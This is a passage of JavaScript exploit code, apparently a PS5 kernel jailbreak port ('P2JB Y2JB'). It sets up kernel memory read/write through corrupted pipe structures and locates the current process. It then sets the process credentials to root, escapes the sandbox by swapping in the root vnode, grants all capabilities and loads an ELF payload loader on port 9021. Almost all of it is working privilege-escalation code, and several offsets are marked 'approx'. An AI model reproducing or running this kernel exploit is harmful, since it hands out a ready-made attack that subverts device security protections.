            write64(pipe_cmd_buf + 16n, BigInt(buf_addr));
            safe_syscall(SYSCALL.write, master_wfd, pipe_cmd_buf, 24n);
            return safe_syscall(SYSCALL.read, master_rfd, pipe_cmd_buf, 24n);
        }

        function kread(buf, kaddr, size) {
            buf = BigInt(buf); kaddr = BigInt(kaddr); size = BigInt(size);
            set_victim_pipe(size, 0n, 0n, 0x4000n, kaddr);
            return safe_syscall(SYSCALL.read, victim_rfd, buf, size);
        }

        function kwrite(kaddr, buf, size) {
            kaddr = BigInt(kaddr); buf = BigInt(buf); size = BigInt(size);
            set_victim_pipe(0n, 0n, 0n, 0x4000n, kaddr);
            return safe_syscall(SYSCALL.write, victim_wfd, buf, size);
        }

        function kread32(kaddr) { kread(scratch_big, BigInt(kaddr), 4n); return read32(scratch_big); }
        function kread64(kaddr) { kread(scratch_big, BigInt(kaddr), 8n); return read64(scratch_big); }
        function kwrite32(kaddr, val) { write32(scratch_big, BigInt(val)); kwrite(BigInt(kaddr), scratch_big, 4n); }
        function kwrite64(kaddr, val) { write64(scratch_big, BigInt(val)); kwrite(BigInt(kaddr), scratch_big, 8n); }

        let verify_ok = false;
        for (let attempt = 1; attempt <= 3; attempt++) {
            if (kread64(master_pipe_data + 0x10n) === victim_pipe_data) { verify_ok = true; break; }
            exploit_sleep_100ms(); repair_triplets();
            kwrite_slow(master_pipe_data, pipe_overwrite, 24);
        }
        if (!verify_ok) { await log("[3] verify failed"); return; }
        await log("[3] kernel r/w achieved");

        // Stage 3b: Cleanup
        function get_file_ptr(fd) { return kread64(fd_ofiles + BigInt(fd) * runtime_offsets.FILEDESCENT_SIZE); }
        function bump_refcount(fp, delta) {
            let rc = kread32(fp + runtime_offsets.FILE_REFCNT);
            if (rc > 0n && rc < 0x10000n) {
                kwrite32(fp + runtime_offsets.FILE_REFCNT, rc + BigInt(delta));
                return true;
            }
            return false;
        }
        function null_socket_rthdr(fd) {
            let fp = kread64(fd_ofiles + BigInt(fd) * runtime_offsets.FILEDESCENT_SIZE);
            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
            let f_data = kread64(fp);
            if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
            let so_pcb = kread64(f_data + runtime_offsets.SO_PCB);
            if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
            let pktopts = kread64(so_pcb + runtime_offsets.INPCB_PKTOPTS); // INPCB_PKTOPTS approx
            if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
            kwrite64(pktopts + runtime_offsets.IP6PO_RTHDR, 0n); // IP6PO_RTHDR approx
        }

        let master_rfp = get_file_ptr(master_rfd);
        let master_wfp = get_file_ptr(master_wfd);
        let victim_rfp = get_file_ptr(victim_rfd);
        let victim_wfp = get_file_ptr(victim_wfd);

        bump_refcount(master_rfp, 0x100n); bump_refcount(master_wfp, 0x100n);
        bump_refcount(victim_rfp, 0x100n); bump_refcount(victim_wfp, 0x100n);

        for (let i = 0; i < ipv6_count; i++) null_socket_rthdr(ipv6_sockets[i]);

        for (let i = free_fd_idx; i < FREE_FDS_NUM; i++) safe_syscall(SYSCALL.close, free_fds[i]);
        for (let i = 0; i < ipv6_count; i++) safe_syscall(SYSCALL.close, ipv6_sockets[i]);
        safe_syscall(SYSCALL.close, iov_sock_a); safe_syscall(SYSCALL.close, iov_sock_b);

        await log("[3b] race cleanup done");
        exploit_sleep_3sec();

        await log("Stage 4 Find curproc via ioctl FIOSETOWN + sigio");
        send_notification("Stage 4\nFind curproc via ioctl FIOSETOWN + sigio");

        let sigio_pipe = malloc(8);
        safe_syscall(SYSCALL.pipe, sigio_pipe);
        let sigio_rfd = read32(sigio_pipe);
        let sigio_wfd = read32(sigio_pipe + 4n);

        let our_pid = safe_syscall(SYSCALL.getpid);
        let pid_buf = malloc(4); write32(pid_buf, our_pid);
        safe_syscall(SYSCALL.ioctl, sigio_rfd, 0x8004667Cn, pid_buf);

        let sigio_fp = get_file_ptr(sigio_rfd);
        let sigio_pipe_addr = kread64(sigio_fp);
        let pipe_sigio = kread64(sigio_pipe_addr + runtime_offsets.PIPE_SIGIO); // PIPE_SIGIO approx
        let curproc = kread64(pipe_sigio);
        if (!curproc || (curproc >> 48n) !== 0xFFFFn) {
            await log("Validation Error: curproc failed canonical wrapping verification");
            return;
        }
        let verify_pid = kread32(curproc + runtime_offsets.PROC_PID); // PROC_PID approx

        if (verify_pid !== our_pid) { await log("[4] pid mismatch"); send_notification("[4] pid mismatch"); return; }

        safe_syscall(SYSCALL.close, sigio_rfd); safe_syscall(SYSCALL.close, sigio_wfd);

        let proc_ucred = kread64(curproc + runtime_offsets.PROC_UCRED); // PROC_UCRED approx
        let proc_fd = kread64(curproc + runtime_offsets.PROC_FD);    // PROC_FD approx
        await log("[4] curproc=" + toHex(curproc) + " fd=" + toHex(proc_fd));

        let init_proc = kread64(curproc + runtime_offsets.P_PPTR); // p_pptr
        let init_fd = kread64(init_proc + runtime_offsets.PROC_FD);
        let rootvnode = kread64(init_fd + runtime_offsets.FD_RDIR); // FD_RDIR approx

        await log("[4] rootvnode=" + toHex(rootvnode));

        await log("Stage 5 Jailbreak");
        send_notification("Stage 5\nJailbreak");

        kwrite32(proc_ucred + runtime_offsets.UCRED_CR_UID, 0n); // UCRED_CR_UID
        kwrite32(proc_ucred + runtime_offsets.UCRED_CR_RUID, 0n); // UCRED_CR_RUID
        kwrite32(proc_ucred + runtime_offsets.UCRED_CR_SVUID, 0n); // UCRED_CR_SVUID
        kwrite32(proc_ucred + runtime_offsets.UCRED_CR_NGROUPS, 1n); // UCRED_CR_NGROUPS
        kwrite32(proc_ucred + runtime_offsets.UCRED_CR_RGID, 0n); // UCRED_CR_RGID

        let attrs_qword = kread64(proc_ucred + runtime_offsets.UCRED_CR_MAC);
        attrs_qword = (attrs_qword & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
        kwrite64(proc_ucred + runtime_offsets.UCRED_CR_MAC, attrs_qword);

        kwrite64(proc_fd + runtime_offsets.FD_RDIR, rootvnode); // FD_RDIR
        kwrite64(proc_fd + runtime_offsets.FD_JDIR, rootvnode); // FD_JDIR

        let verify_uid = kread32(proc_ucred + runtime_offsets.UCRED_CR_UID);
        if (verify_uid === 0n) {
            await log("[5] jailbreak ok");
            send_notification("[5] jailbreak ok");
        } else {
            await log("[5] jailbreak verify failed uid=" + verify_uid);
            send_notification("[5] jailbreak verify failed");
            return;
        }

        await log("Stage 6 GPU setup + debug patches");
        send_notification("Stage 6\nGPU setup + debug patches");
        // Using stubs for gpu methods natively inside Y2JB if exposed globally or fallback
        if (typeof gpu !== 'undefined' && typeof gpu.setup === 'function') {
            let gpu_ok = gpu.setup();
            if (gpu_ok) {
                await log("[6] gpu setup ok");
                gpu.patch_debug(log);
            }
        } else {
            await log("[6] gpu context skipped / handled externally");
            send_notification("[6] gpu context skipped / handled externally");
        }

        await log("Stage 7 ELF loader");
        send_notification("Stage 7\nELF loader");
        // Set authid and caps for full privileges
        kwrite64(proc_ucred + runtime_offsets.UCRED_CR_SCEAUTHID, 0x4800000000010003n); // UCRED_CR_SCEAUTHID
        kwrite64(proc_ucred + runtime_offsets.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn); // UCRED_CR_SCECAPS0
        kwrite64(proc_ucred + runtime_offsets.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn); // UCRED_CR_SCECAPS1

        if (typeof load_elfldr === 'function') {
            load_elfldr();
            await log("ELF Loader loaded");
        } else {
            await log("load_elfldr not globally exposed, using native payload handler instead");
        }

        await log("Jailbreak complete! Payload sent successfully to Port 9021!");
        if (typeof show_dialog !== 'undefined') {
            show_dialog("Jailbreak complete!\nPayload ready on port 9021.\nVersion: " + p2jb_version_string);
        } else {
            send_notification("Jailbreak complete! Payload sent successfully to Port 9021!");
        }

    } catch (e) {
        await log("Error in P2JB Y2JB Port: " + e.message);
        if (typeof show_dialog !== 'undefined') {
            show_dialog("Error: " + e.message);
        } else {
            send_notification("Error: " + e.message);
        }
    }
}

p2jb_ps5();
